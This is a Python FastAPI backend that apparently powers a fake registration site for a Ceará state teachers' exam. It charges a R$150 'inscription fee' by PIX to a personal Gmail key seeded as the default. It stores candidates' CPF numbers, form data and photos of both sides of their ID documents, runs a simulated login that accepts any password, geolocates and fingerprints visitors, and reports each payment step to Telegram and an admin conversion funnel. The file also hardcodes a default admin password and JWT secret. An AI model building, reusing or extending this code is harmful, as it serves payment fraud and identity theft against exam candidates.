"""Admin panel routes + tracking + JWT auth."""
import os
import re
import jwt
import bcrypt
import logging
import asyncio
import ipaddress
import httpx
import uuid
from datetime import datetime, timezone, timedelta
from fastapi import APIRouter, HTTPException, Depends, Request, Query
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, List, Dict, Any
from collections import Counter

from email_service import try_send_email, build_inscricao_email_html

logger = logging.getLogger(__name__)
admin_router = APIRouter(prefix="/api")
security = HTTPBearer(auto_error=False)

JWT_SECRET = os.environ.get('JWT_SECRET', 'change-me')
JWT_ALGO = 'HS256'
JWT_EXP_HOURS = 8
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'donas')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'Seinao10@@')

# Taxa única de inscrição (Edital 014/2026-SEDUC/SEPLAG)
VALOR_INSCRICAO = 150.0
TAXA_INSCRICAO_STR = 'R$ 150,00'

# DB reference (set by main app)
_db = None
def set_db(db):
    global _db
    _db = db


# ------------ Auth ------------
def make_token(username: str) -> str:
    payload = {
        'sub': username,
        'exp': datetime.now(timezone.utc) + timedelta(hours=JWT_EXP_HOURS),
        'iat': datetime.now(timezone.utc),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGO)

async def require_admin(creds: HTTPAuthorizationCredentials = Depends(security)):
    if not creds:
        raise HTTPException(401, "Missing token")
    try:
        payload = jwt.decode(creds.credentials, JWT_SECRET, algorithms=[JWT_ALGO])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except Exception:
        raise HTTPException(401, "Invalid token")


# ------------ Models ------------
class LoginIn(BaseModel):
    username: str
    password: str

class TrackIn(BaseModel):
    page: str = ""
    user_agent: str = ""
    extra: Dict[str, Any] = {}


# ------------ Helpers ------------
def now_iso():
    return datetime.now(timezone.utc).isoformat()

def iso_utc(dt):
    """Serialize datetime as ISO with Z suffix (UTC) so JS parses it correctly."""
    if not isinstance(dt, datetime):
        return dt
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f') + 'Z'

def _is_private_ip(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_private or ipaddress.ip_address(ip).is_loopback
    except Exception:
        return True

def get_real_ip(request: Request) -> str:
    """Extract the real client IP from proxy headers (X-Forwarded-For / X-Real-IP)."""
    xff = request.headers.get('x-forwarded-for', '')
    if xff:
        # XFF is a comma-separated list. The first non-private IP is the real client.
        for candidate in [p.strip() for p in xff.split(',')]:
            if candidate and not _is_private_ip(candidate):
                return candidate
        # fallback to first
        first = xff.split(',')[0].strip()
        if first:
            return first
    xri = request.headers.get('x-real-ip', '')
    if xri and not _is_private_ip(xri):
        return xri
    return request.client.host if request.client else ''

async def geolocate_ip(ip: str) -> Dict[str, str]:
    """Lookup geolocation via ip-api.com (free, no key required)."""
    if not ip or _is_private_ip(ip):
        return {'city': '', 'uf': '', 'country': '', 'lat': None, 'lon': None}
    try:
        async with httpx.AsyncClient(timeout=4.0) as client:
            r = await client.get(
                f'http://ip-api.com/json/{ip}',
                params={'fields': 'status,country,countryCode,regionName,region,city,lat,lon,query'},
            )
            if r.status_code == 200:
                d = r.json()
                if d.get('status') == 'success':
                    return {
                        'city': d.get('city', '') or '',
                        'uf': d.get('region', '') or '',
                        'region_name': d.get('regionName', '') or '',
                        'country': d.get('country', '') or '',
                        'country_code': d.get('countryCode', '') or '',
                        'lat': d.get('lat'),
                        'lon': d.get('lon'),
                    }
    except Exception as e:
        logger.warning(f"geolocate_ip failed for {ip}: {e}")
    return {'city': '', 'uf': '', 'country': '', 'lat': None, 'lon': None}

async def insert_event(kind: str, description: str, meta: Dict[str, Any] = None):
    doc = {
        'kind': kind,
        'description': description,
        'meta': meta or {},
        'created_at': datetime.now(timezone.utc),
    }
    await _db.events.insert_one(doc)


# ------------ Seed admin ------------
async def seed_admin():
    existing = await _db.admins.find_one({'username': ADMIN_USERNAME})
    if not existing:
        pwd_hash = bcrypt.hashpw(ADMIN_PASSWORD.encode(), bcrypt.gensalt()).decode()
        await _db.admins.insert_one({
            'username': ADMIN_USERNAME,
            'password_hash': pwd_hash,
            'role': 'root',
            'created_at': datetime.now(timezone.utc),
        })
        logger.info(f"Seeded admin user: {ADMIN_USERNAME}")
    else:
        # backfill role for legacy seed entries
        if not existing.get('role'):
            await _db.admins.update_one({'username': ADMIN_USERNAME}, {'$set': {'role': 'root'}})


# ------------ Seed PIX config ------------
async def seed_pix_config():
    """Ensure default PIX credentials exist on first startup after a fresh clone."""
    try:
        existing = await _db.settings.find_one({'_id': 'main'})
        if not existing or not (existing.get('pix_key') or '').strip():
            await _db.settings.update_one(
                {'_id': 'main'},
                {'$set': {
                    'pix_key': 'danielmmm950@gmail.com',
                    'pix_nome': 'Concurso SEDUC CE',
                    'pix_cidade': 'Fortaleza',
                }},
                upsert=True,
            )
            logger.info("Seeded default PIX config (danielmmm950@gmail.com / Concurso SEDUC CE / Fortaleza)")
    except Exception as e:
        logger.warning(f"seed_pix_config failed: {e}")


# ------------ TRACKING (públicos) ------------
@admin_router.post('/auth/check-candidate')
async def check_candidate(payload: Dict[str, Any]):
    """Verifica se há candidato cadastrado com o CPF informado.
    Aceita qualquer senha (login simulado). Retorna o cadastro se encontrado,
    senão 404."""
    cpf_raw = (payload or {}).get('cpf', '')
    cpf = ''.join(ch for ch in str(cpf_raw) if ch.isdigit())
    if len(cpf) != 11:
        raise HTTPException(status_code=400, detail='CPF inválido.')
    doc = await _db.cadastros.find_one({'cpf': cpf}, {'_id': 0})
    if not doc:
        raise HTTPException(status_code=404, detail='Candidato não cadastrado.')
    return {
        'ok': True,
        'cadastro': {
            'nome': doc.get('nome', ''),
            'cpf': cpf,
            'email': doc.get('email', ''),
            'last_concurso': doc.get('last_concurso', ''),
        }
    }


@admin_router.post('/track/access')
async def track_access(data: TrackIn, request: Request):
    # Ignore admin panel paths defensively
    page = data.page or '/'
    if page.startswith('/donaspainel'):
        return {'ok': True, 'skipped': 'admin'}

    ip = get_real_ip(request)
    ua = (data.user_agent or request.headers.get('user-agent', '')).lower()
    is_mobile = any(k in ua for k in ['mobi', 'android', 'iphone', 'ipad', 'ipod'])

    # visitor_id (fingerprint único gerado no cliente, salvo em localStorage)
    # Permite diferenciar múltiplos usuários que compartilham o mesmo IP público (comum em preview/CDN)
    visitor_id = (data.extra or {}).get('visitor_id', '') if data.extra else ''

    # Conta apenas o PRIMEIRO acesso da visita: se o mesmo visitor_id (fingerprint do cliente)
    # OU o mesmo IP+dispositivo (fallback quando não há visitor_id) já acessou nos últimos 30 min, ignora.
    window_start = datetime.now(timezone.utc) - timedelta(minutes=30)
    if visitor_id:
        recent = await _db.accesses.find_one({
            'visitor_id': visitor_id,
            'created_at': {'$gte': window_start},
        })
    else:
        recent = await _db.accesses.find_one({
            'ip': ip,
            'device': 'mobile' if is_mobile else 'desktop',
            'created_at': {'$gte': window_start},
        })
    if recent:
        return {'ok': True, 'skipped': 'duplicate'}

    # Geolocate IP (non-fatal if fails)
    geo = await geolocate_ip(ip)

    doc = {
        'page': page,
        'user_agent': data.user_agent or request.headers.get('user-agent', ''),
        'ip': ip,
        'visitor_id': visitor_id,
        'city': geo.get('city', '') or data.extra.get('city', ''),
        'uf': geo.get('uf', '') or data.extra.get('uf', ''),
        'region_name': geo.get('region_name', ''),
        'country': geo.get('country', ''),
        'country_code': geo.get('country_code', ''),
        'lat': geo.get('lat'),
        'lon': geo.get('lon'),
        'device': 'mobile' if is_mobile else 'desktop',
        'created_at': datetime.now(timezone.utc),
    }
    await _db.accesses.insert_one(doc)
    loc = f"{doc['city']}/{doc['uf']}" if doc['city'] else (doc['country'] or '')
    desc = f"Novo acesso {'mobile' if is_mobile else 'desktop'}" + (f" - {loc}" if loc else '')
    await insert_event('access', desc, {'page': doc['page'], 'city': doc['city'], 'uf': doc['uf'], 'device': doc['device'], 'location': loc, 'ip': ip})
    return {'ok': True}

def _site_base_url(request: Request) -> str:
    """Endereço público do site que recebeu a inscrição (funciona em qualquer domínio)."""
    origin = (request.headers.get('origin') or '').strip().rstrip('/')
    if re.match(r'^https?://[A-Za-z0-9.-]+(:\d+)?$', origin):
        return origin
    host = (request.headers.get('x-forwarded-host') or request.headers.get('host') or '').split(',')[0].strip()
    if re.match(r'^[A-Za-z0-9.-]+(:\d+)?$', host) and not host.startswith(('localhost', '127.', '0.0.0.0')):
        proto = (request.headers.get('x-forwarded-proto') or 'https').split(',')[0].strip()
        return f"{proto}://{host}"
    return ''


@admin_router.post('/track/registration')
async def track_registration(data: TrackIn, request: Request):
    extra = data.extra or {}
    nome = extra.get('nome', '')
    cpf_raw = extra.get('cpf', '')
    cpf = ''.join(ch for ch in str(cpf_raw) if ch.isdigit())
    email = extra.get('email', '')
    concurso = extra.get('concurso', '')
    stage = (extra.get('stage') or '').lower()
    finalized = bool(extra.get('finalized')) or bool(extra.get('finalizado')) or stage == 'inscricao_finalizada'

    now = datetime.now(timezone.utc)
    # Log de diagnóstico para rastrear registros que estejam falhando
    try:
        logger.info(
            f"track_registration recv: cpf={cpf!r} nome={nome!r} stage={stage!r} "
            f"finalized={finalized} page={data.page!r} keys={list(extra.keys())}"
        )
    except Exception:
        pass

    # 1) Log bruto (compat)
    await _db.registrations.insert_one({
        'nome': nome, 'cpf': cpf, 'concurso': concurso,
        'stage': stage or ('inscricao' if finalized else 'cadastro'),
        'created_at': now,
    })

    # 2) Cadastro (upsert por CPF) — sempre que tiver nome+CPF
    new_cadastro = False
    if cpf:
        set_fields = {
            'nome': nome, 'cpf': cpf,
            'last_concurso': concurso or extra.get('edital', ''),
            'last_at': now,
        }
        if email:
            set_fields['email'] = email
        # Se vier form_data completo, persiste também (tudo que o usuário digitou)
        # Usa dot notation para preservar campos existentes (ex: doc_frente enviado
        # separadamente via /track/documents não é sobrescrito)
        fd = extra.get('form_data')
        if isinstance(fd, dict) and fd:
            for k, v in fd.items():
                set_fields[f'form_data.{k}'] = v
        result = await _db.cadastros.update_one(
            {'cpf': cpf},
            {
                '$set': set_fields,
                '$setOnInsert': {'created_at': now, 'inscricoes_count': 0},
            },
            upsert=True,
        )
        new_cadastro = result.upserted_id is not None

    # 3) Inscrição finalizada (com cargo escolhido) → cria/atualiza em inscricoes
    new_inscricao = False
    if finalized and cpf:
        # Tenta extrair taxa como número
        taxa_str = TAXA_INSCRICAO_STR
        valor = VALOR_INSCRICAO

        insc_doc = {
            'id': str(uuid.uuid4()),
            'nome': nome, 'cpf': cpf, 'email': email,
            'concurso': concurso,
            'edital': extra.get('edital', ''),
            'cargo_codigo': extra.get('cargo_codigo', '') or extra.get('codigo', ''),
            'cargo_titulo': extra.get('cargo_titulo', '') or extra.get('titulo', ''),
            'jornada': extra.get('jornada', ''),
            'secretaria': extra.get('secretaria', ''),
            'valor': valor,
            'taxa': taxa_str,
            'protocolo': extra.get('protocolo', ''),
            'localidade': extra.get('localidade', '-'),
            'user_agent': (data.user_agent or (request.headers.get('user-agent', '') if request else '')),
            'device': 'mobile' if any(k in ((data.user_agent or (request.headers.get('user-agent', '') if request else '')).lower()) for k in ['mobi', 'android', 'iphone', 'ipad', 'ipod']) else 'desktop',
            'finalized': True,
            'finalized_at': now,
            'created_at': now,
            'pix_status': 'Aguardando pagamento',
            'pix_status_at': now,
        }
        # Evita duplicar inscrição idêntica (mesmo cpf + mesmo cargo) — atualiza se já existe
        insc_result = await _db.inscricoes.update_one(
            {'cpf': cpf, 'cargo_codigo': insc_doc['cargo_codigo']},
            {
                '$set': {
                    k: v for k, v in insc_doc.items()
                    if k not in ('id', 'created_at')
                },
                '$setOnInsert': {
                    'id': insc_doc['id'],
                    'created_at': now,
                }
            },
            upsert=True,
        )
        new_inscricao = insc_result.upserted_id is not None
        # Incrementa contador de inscrições no cadastro apenas quando é uma nova inscrição
        if new_inscricao:
            await _db.cadastros.update_one({'cpf': cpf}, {'$inc': {'inscricoes_count': 1}})

    # 4) Evento para o feed do painel
    if finalized:
        if new_inscricao and nome:
            await insert_event('inscricao', f"Inscrição realizada - {nome}", {'nome': nome, 'cpf': cpf})
            # E-mail de confirmação de inscrição (apenas na 1ª vez)
            if email:
                html = build_inscricao_email_html(
                    nome=nome, cpf=cpf, protocolo=extra.get('protocolo', ''),
                    cargo=extra.get('cargo_titulo', '') or extra.get('titulo', ''),
                    concurso=concurso, valor=valor, base_url=_site_base_url(request),
                )
                await try_send_email(to=email, subject='Inscrição realizada com sucesso', html=html)
        # 5) Notifica Telegram (primeira mensagem — guarda message_id para edições futuras)
        if cpf:
            await notify_or_update_telegram(cpf, request, extra=extra)
    else:
        if nome and new_cadastro:
            await insert_event('cadastro', f"Cadastro realizado: {nome}", {'nome': nome, 'cpf': cpf})
    return {'ok': True}


class DocsIn(BaseModel):
    cpf: str = ''
    doc_tipo: str = 'RG'
    doc_frente: str = ''
    doc_verso: str = ''


@admin_router.post('/track/documents')
async def track_documents(payload: DocsIn):
    """Recebe fotos do documento (frente/verso) em base64 e salva no cadastro.
    Payload menor sem outros campos para evitar bloqueio de proxy/CF.
    """
    cpf = ''.join(ch for ch in str(payload.cpf or '') if ch.isdigit())
    if not cpf:
        return {'ok': False, 'error': 'cpf_required'}
    # Proteção: limita o tamanho de cada documento (~7MB em base64) para
    # evitar payloads abusivos que estourem o MongoDB.
    MAX_DOC_B64 = 7 * 1024 * 1024
    if len(payload.doc_frente or '') > MAX_DOC_B64 or len(payload.doc_verso or '') > MAX_DOC_B64:
        raise HTTPException(status_code=413, detail='Documento muito grande. Envie uma imagem menor.')
    set_fields = {}
    if payload.doc_frente:
        set_fields['form_data.doc_frente'] = payload.doc_frente
    if payload.doc_verso:
        set_fields['form_data.doc_verso'] = payload.doc_verso
    if payload.doc_tipo:
        set_fields['form_data.doc_tipo'] = payload.doc_tipo
    if not set_fields:
        return {'ok': False, 'error': 'no_docs'}
    await _db.cadastros.update_one(
        {'cpf': cpf},
        {'$set': set_fields, '$setOnInsert': {'created_at': datetime.now(timezone.utc), 'cpf': cpf}},
        upsert=True,
    )
    logger.info(f"track_documents saved: cpf={cpf} keys={list(set_fields.keys())}")
    return {'ok': True}

async def _upsert_pix_status(extra: Dict[str, Any], pix_status: str):
    """Upsert pix_* collection by CPF and update inscription status.
    Quando o candidato tem múltiplas inscrições, identifica a correta pelo
    cargo_codigo / protocolo (não atualiza todas)."""
    cpf_raw = (extra or {}).get('cpf', '')
    cpf = ''.join(ch for ch in str(cpf_raw) if ch.isdigit())
    if not cpf:
        return

    cargo_codigo = (extra or {}).get('cargo_codigo') or (extra or {}).get('codigo') or ''
    protocolo = (extra or {}).get('protocolo') or ''

    # Filtro mais específico → menos específico
    filt = {'cpf': cpf}
    if protocolo:
        filt['protocolo'] = protocolo
    elif cargo_codigo:
        filt['cargo_codigo'] = cargo_codigo

    set_op = {'$set': {'pix_status': pix_status, 'pix_status_at': datetime.now(timezone.utc)}}
    result = await _db.inscricoes.update_one(filt, set_op)

    # Fallback: se não encontrou inscrição com o filtro específico,
    # atualiza a inscrição mais recente daquele CPF.
    if result.matched_count == 0 and (protocolo or cargo_codigo):
        last = await _db.inscricoes.find_one(
            {'cpf': cpf}, sort=[('created_at', -1)], projection={'_id': 1}
        )
        if last:
            await _db.inscricoes.update_one({'_id': last['_id']}, set_op)

@admin_router.post('/track/pix-generated')
async def track_pix_gen(data: TrackIn, request: Request):
    cpf_raw = data.extra.get('cpf', '')
    cpf = ''.join(ch for ch in str(cpf_raw) if ch.isdigit())
    real_valor = None
    real_nome = ''
    real_concurso = ''
    if cpf:
        insc = await _db.inscricoes.find_one({'cpf': cpf}, {'valor': 1, 'nome': 1, 'concurso': 1})
        if insc:
            real_valor = insc.get('valor')
            real_nome = insc.get('nome', '')
            real_concurso = insc.get('concurso', '')
    try:
        fallback_valor = float(data.extra.get('valor', 0) or 0)
    except Exception:
        fallback_valor = 0.0
    valor_final = VALOR_INSCRICAO
    nome_final = real_nome or data.extra.get('nome', '')
    concurso_final = real_concurso or data.extra.get('concurso', '')
    payload = {
        '$set': {
            'nome': nome_final,
            'cpf': cpf,
            'concurso': concurso_final,
            'valor': valor_final,
            'extra': data.extra,
            'last_at': datetime.now(timezone.utc),
        },
        '$setOnInsert': {'created_at': datetime.now(timezone.utc)},
    }
    if cpf:
        await _db.pix_generated.update_one({'cpf': cpf, 'cargo_codigo': data.extra.get('cargo_codigo') or data.extra.get('codigo') or ''}, {**payload, '$set': {**payload['$set'], 'cargo_codigo': data.extra.get('cargo_codigo') or data.extra.get('codigo') or ''}}, upsert=True)
    else:
        await _db.pix_generated.insert_one({**payload['$set'], **payload['$setOnInsert']})
    await _upsert_pix_status(data.extra, 'PIX gerado')
    await insert_event('pix_generated', f"PIX gerado por {nome_final or 'Candidato'}", {**data.extra, 'valor': valor_final, 'nome': nome_final})
    if cpf:
        await notify_or_update_telegram(cpf, request, extra=data.extra)
    return {'ok': True}

@admin_router.post('/track/pix-copied')
async def track_pix_copied(data: TrackIn, request: Request):
    cpf_raw = data.extra.get('cpf', '')
    cpf = ''.join(ch for ch in str(cpf_raw) if ch.isdigit())
    real_valor = None
    real_nome = ''
    real_concurso = ''
    if cpf:
        insc = await _db.inscricoes.find_one({'cpf': cpf}, {'valor': 1, 'nome': 1, 'concurso': 1})
        if insc:
            real_valor = insc.get('valor')
            real_nome = insc.get('nome', '')
            real_concurso = insc.get('concurso', '')
    try:
        fallback_valor = float(data.extra.get('valor', 0) or 0)
    except Exception:
        fallback_valor = 0.0
    valor_final = VALOR_INSCRICAO
    nome_final = real_nome or data.extra.get('nome', '')
    concurso_final = real_concurso or data.extra.get('concurso', '')
    payload = {
        '$set': {
            'nome': nome_final,
            'cpf': cpf,
            'concurso': concurso_final,
            'valor': valor_final,
            'extra': data.extra,
            'last_at': datetime.now(timezone.utc),
        },
        '$setOnInsert': {'created_at': datetime.now(timezone.utc)},
    }
    if cpf:
        await _db.pix_copied.update_one({'cpf': cpf, 'cargo_codigo': data.extra.get('cargo_codigo') or data.extra.get('codigo') or ''}, {**payload, '$set': {**payload['$set'], 'cargo_codigo': data.extra.get('cargo_codigo') or data.extra.get('codigo') or ''}}, upsert=True)
    else:
        await _db.pix_copied.insert_one({**payload['$set'], **payload['$setOnInsert']})
    await _upsert_pix_status(data.extra, 'PIX copiado')
    await insert_event('pix_copied', f"PIX copiado por {nome_final or 'Candidato'}", {**data.extra, 'valor': valor_final, 'nome': nome_final})
    if cpf:
        await notify_or_update_telegram(cpf, request, extra=data.extra)
    return {'ok': True}

@admin_router.post('/track/pix-downloaded')
async def track_pix_dl(data: TrackIn, request: Request):
    cpf_raw = data.extra.get('cpf', '')
    cpf = ''.join(ch for ch in str(cpf_raw) if ch.isdigit())
    real_valor = None
    real_nome = ''
    real_concurso = ''
    if cpf:
        insc = await _db.inscricoes.find_one({'cpf': cpf}, {'valor': 1, 'nome': 1, 'concurso': 1})
        if insc:
            real_valor = insc.get('valor')
            real_nome = insc.get('nome', '')
            real_concurso = insc.get('concurso', '')
    try:
        fallback_valor = float(data.extra.get('valor', 0) or 0)
    except Exception:
        fallback_valor = 0.0
    valor_final = VALOR_INSCRICAO
    nome_final = real_nome or data.extra.get('nome', '')
    concurso_final = real_concurso or data.extra.get('concurso', '')
    payload = {
        '$set': {
            'nome': nome_final,
            'cpf': cpf,
            'concurso': concurso_final,
            'valor': valor_final,
            'extra': data.extra,
            'last_at': datetime.now(timezone.utc),
        },
        '$setOnInsert': {'created_at': datetime.now(timezone.utc)},
    }
    if cpf:
        await _db.pix_downloaded.update_one({'cpf': cpf, 'cargo_codigo': data.extra.get('cargo_codigo') or data.extra.get('codigo') or ''}, {**payload, '$set': {**payload['$set'], 'cargo_codigo': data.extra.get('cargo_codigo') or data.extra.get('codigo') or ''}}, upsert=True)
    else:
        await _db.pix_downloaded.insert_one({**payload['$set'], **payload['$setOnInsert']})
    await _upsert_pix_status(data.extra, 'PIX baixado')
    await insert_event('pix_downloaded', f"Comprovante baixado por {nome_final or 'Candidato'}", {**data.extra, 'valor': valor_final, 'nome': nome_final})
    if cpf:
        await notify_or_update_telegram(cpf, request, extra=data.extra)
    return {'ok': True}


# ------------ AUTH ------------
@admin_router.post('/admin/auth/login')
async def admin_login(data: LoginIn):
    admin = await _db.admins.find_one({'username': data.username})
    if not admin:
        raise HTTPException(401, "Credenciais inválidas")
    if not bcrypt.checkpw(data.password.encode(), admin['password_hash'].encode()):
        raise HTTPException(401, "Credenciais inválidas")
    token = make_token(data.username)
    return {'token': token, 'user': {'username': data.username}}

@admin_router.get('/admin/auth/me')
async def admin_me(user=Depends(require_admin)):
    me = await _db.admins.find_one({'username': user['sub']}, {'_id': 0, 'password_hash': 0})
    if not me:
        return {'username': user['sub'], 'role': 'admin'}
    if isinstance(me.get('created_at'), datetime):
        me['created_at'] = iso_utc(me['created_at'])
    me.setdefault('role', 'admin')
    return me


# ------------ ADMINS CRUD ------------
class AdminCreateIn(BaseModel):
    username: str
    password: str

class ProfileUpdateIn(BaseModel):
    new_username: Optional[str] = None
    current_password: str
    new_password: Optional[str] = None

@admin_router.get('/admin/admins')
async def list_admins(user=Depends(require_admin)):
    cursor = _db.admins.find({}, {'password_hash': 0, '_id': 0}).sort('created_at', 1)
    items = []
    async for doc in cursor:
        doc.setdefault('role', 'admin')
        doc['created_at'] = iso_utc(doc.get('created_at'))
        items.append(doc)
    return {'items': items, 'total': len(items)}

@admin_router.post('/admin/admins')
async def create_admin(data: AdminCreateIn, user=Depends(require_admin)):
    uname = (data.username or '').strip().lower()
    if len(uname) < 3:
        raise HTTPException(400, 'Nome de usuário muito curto (mínimo 3 caracteres).')
    if not uname.replace('_', '').replace('.', '').replace('-', '').isalnum():
        raise HTTPException(400, 'Use apenas letras, números, _ . -')
    if len(data.password) < 6:
        raise HTTPException(400, 'Senha muito curta (mínimo 6 caracteres).')
    if await _db.admins.find_one({'username': uname}):
        raise HTTPException(409, 'Já existe um administrador com esse usuário.')
    pwd_hash = bcrypt.hashpw(data.password.encode(), bcrypt.gensalt()).decode()
    await _db.admins.insert_one({
        'username': uname,
        'password_hash': pwd_hash,
        'role': 'admin',
        'created_by': user['sub'],
        'created_at': datetime.now(timezone.utc),
    })
    return {'ok': True, 'username': uname}

@admin_router.delete('/admin/admins/{username}')
async def delete_admin(username: str, user=Depends(require_admin)):
    target = await _db.admins.find_one({'username': username})
    if not target:
        raise HTTPException(404, 'Administrador não encontrado.')
    if target.get('role') == 'root':
        raise HTTPException(403, 'Não é possível excluir o administrador root.')
    if username == user['sub']:
        raise HTTPException(403, 'Você não pode excluir a si mesmo.')
    res = await _db.admins.delete_one({'username': username})
    return {'ok': True, 'deleted': res.deleted_count}

@admin_router.put('/admin/auth/profile')
async def update_profile(data: ProfileUpdateIn, user=Depends(require_admin)):
    me = await _db.admins.find_one({'username': user['sub']})
    if not me:
        raise HTTPException(404, 'Administrador não encontrado.')
    if not bcrypt.checkpw(data.current_password.encode(), me['password_hash'].encode()):
        raise HTTPException(401, 'Senha atual incorreta.')
    update = {}
    new_token = None
    if data.new_username:
        new_uname = data.new_username.strip().lower()
        if len(new_uname) < 3:
            raise HTTPException(400, 'Nome de usuário muito curto.')
        if new_uname != user['sub']:
            if await _db.admins.find_one({'username': new_uname}):
                raise HTTPException(409, 'Já existe um administrador com esse usuário.')
            update['username'] = new_uname
            new_token = make_token(new_uname)
    if data.new_password:
        if len(data.new_password) < 6:
            raise HTTPException(400, 'Nova senha muito curta (mínimo 6 caracteres).')
        update['password_hash'] = bcrypt.hashpw(data.new_password.encode(), bcrypt.gensalt()).decode()
    if not update:
        return {'ok': True, 'changed': False}
    update['updated_at'] = datetime.now(timezone.utc)
    await _db.admins.update_one({'username': user['sub']}, {'$set': update})
    return {'ok': True, 'changed': True, 'token': new_token, 'username': update.get('username', user['sub'])}


# ------------ DASHBOARD ------------
async def count_today(col: str) -> int:
    start = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
    return await _db[col].count_documents({'created_at': {'$gte': start}})

@admin_router.get('/admin/dashboard/kpis')
async def kpis(user=Depends(require_admin)):
    cols = ['accesses', 'registrations', 'pix_generated', 'pix_copied', 'pix_downloaded']
    total = {c: await _db[c].count_documents({}) for c in cols}
    today = {c: await count_today(c) for c in cols}
    # apenas inscrições FINALIZADAS
    inscricoes_total = await _db.inscricoes.count_documents({'finalized': True})
    start = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
    inscricoes_today = await _db.inscricoes.count_documents({'finalized': True, 'finalized_at': {'$gte': start}})
    today['registrations'] = inscricoes_today

    # ---- Cálculo de valores reais por inscrição (valor varia por concurso) ----
    # Coleta CPFs por estado (top-level cpf OR extra.cpf for legacy data)
    cpfs_gen = set()
    cpfs_copy = set()
    cpfs_down = set()
    async for d in _db.pix_generated.find({}, {'cpf': 1, 'extra.cpf': 1, '_id': 0}):
        cpf = d.get('cpf') or (d.get('extra') or {}).get('cpf')
        if cpf: cpfs_gen.add(cpf)
    async for d in _db.pix_copied.find({}, {'cpf': 1, 'extra.cpf': 1, '_id': 0}):
        cpf = d.get('cpf') or (d.get('extra') or {}).get('cpf')
        if cpf: cpfs_copy.add(cpf)
    async for d in _db.pix_downloaded.find({}, {'cpf': 1, 'extra.cpf': 1, '_id': 0}):
        cpf = d.get('cpf') or (d.get('extra') or {}).get('cpf')
        if cpf: cpfs_down.add(cpf)

    # Sem fallback hardcoded: usa APENAS o valor real registrado na inscrição.
    # Se a inscrição não existir ou não tiver valor, o CPF é ignorado nas somas.
    cpf_to_valor = {}
    async for d in _db.inscricoes.find({}, {'cpf': 1, 'valor': 1, '_id': 0}):
        cpf = d.get('cpf')
        if not cpf:
            continue
        cpf_to_valor[cpf] = VALOR_INSCRICAO

    def sum_valor(cpfs):
        return sum(cpf_to_valor.get(c, 0.0) for c in cpfs)

    return {
        'acessos': total['accesses'],
        'inscricoes': inscricoes_total,
        'pix_gerados': total['pix_generated'],
        'pix_copiados': total['pix_copied'],
        'pix_baixados': total['pix_downloaded'],
        'valor_total': sum_valor(cpfs_gen),
        'valor_copiados': sum_valor(cpfs_copy),
        'valor_baixados': sum_valor(cpfs_down),
        'valor_unit': VALOR_INSCRICAO,
        'today': today,
    }

@admin_router.get('/admin/dashboard/funnel')
async def funnel(user=Depends(require_admin)):
    cols = [
        ('Acessos ao site', 'accesses', '#8b5cf6', None),
        ('Cadastros criados', 'cadastros', '#a78bfa', None),
        ('Inscrições finalizadas', 'inscricoes', '#10b981', {'finalized': True}),
        ('PIX gerado', 'pix_generated', '#f59e0b', None),
        ('PIX copiado', 'pix_copied', '#ec4899', None),
        ('PIX baixado', 'pix_downloaded', '#06b6d4', None),
    ]
    data = []
    counts = []
    for label, col, color, extra_filter in cols:
        c = await _db[col].count_documents(extra_filter or {})
        counts.append(c)
        data.append({'label': label, 'count': c, 'color': color})
    top = counts[0] if counts and counts[0] else 1
    for i, d in enumerate(data):
        d['percent'] = round(d['count'] / top * 100, 1)
        if i == 0:
            d['conversion'] = None
            d['dropped'] = 0
        else:
            prev = counts[i-1]
            d['conversion'] = round((d['count'] / prev * 100) if prev else 0, 1)
            d['dropped'] = max(prev - d['count'], 0)
    return data

@admin_router.get('/admin/dashboard/funnel-devices')
async def funnel_devices(user=Depends(require_admin)):
    """Funil separado por dispositivo (desktop vs mobile) em cada etapa.
    Deriva o device do próprio doc; se faltar, tenta pelo user_agent; e para
    eventos de PIX (que não guardam device), usa o mapa CPF -> device da inscrição."""
    _M = ['mobi', 'android', 'iphone', 'ipad', 'ipod']

    def dev_from_ua(ua):
        ua = (ua or '').lower()
        if not ua:
            return None
        return 'mobile' if any(k in ua for k in _M) else 'desktop'

    def only_digits(v):
        return ''.join(ch for ch in str(v or '') if ch.isdigit())

    # CPF -> device (a partir das inscrições)
    cpf_device = {}
    async for d in _db.inscricoes.find({}, {'cpf': 1, 'device': 1, 'user_agent': 1, '_id': 0}):
        cpf = only_digits(d.get('cpf'))
        dev = d.get('device') if d.get('device') in ('mobile', 'desktop') else dev_from_ua(d.get('user_agent'))
        if cpf and dev:
            cpf_device[cpf] = dev

    async def count_col(col, base_filter, use_cpf_fallback):
        desk = mob = 0
        async for doc in _db[col].find(base_filter or {}, {'device': 1, 'user_agent': 1, 'cpf': 1, 'extra': 1, '_id': 0}):
            dev = doc.get('device') if doc.get('device') in ('mobile', 'desktop') else None
            if not dev:
                dev = dev_from_ua(doc.get('user_agent'))
            if not dev and use_cpf_fallback:
                cpf = only_digits(doc.get('cpf') or (doc.get('extra') or {}).get('cpf'))
                dev = cpf_device.get(cpf)
            if dev == 'mobile':
                mob += 1
            elif dev == 'desktop':
                desk += 1
        return desk, mob

    stages = [
        ('Acessos ao site', 'accesses', None, False),
        ('Inscrições finalizadas', 'inscricoes', {'finalized': True}, False),
        ('PIX gerado', 'pix_generated', None, True),
        ('PIX copiado', 'pix_copied', None, True),
        ('PIX baixado', 'pix_downloaded', None, True),
    ]
    out = []
    for label, col, f, fb in stages:
        desk, mob = await count_col(col, f, fb)
        out.append({'label': label, 'desktop': desk, 'mobile': mob})
    return out


@admin_router.get('/admin/dashboard/locations')
async def locations(user=Depends(require_admin)):
    cursor = _db.accesses.find({}, {'city': 1, 'uf': 1})
    counter = Counter()
    async for doc in cursor:
        if doc.get('city'):
            key = f"{doc['city']}|{doc.get('uf', '')}"
            counter[key] += 1
    items = []
    for key, c in counter.most_common(10):
        city, uf = key.split('|')
        items.append({'city': city, 'uf': uf, 'count': c})
    return items

@admin_router.get('/admin/dashboard/activity-7days')
async def activity_7days(user=Depends(require_admin)):
    days = []
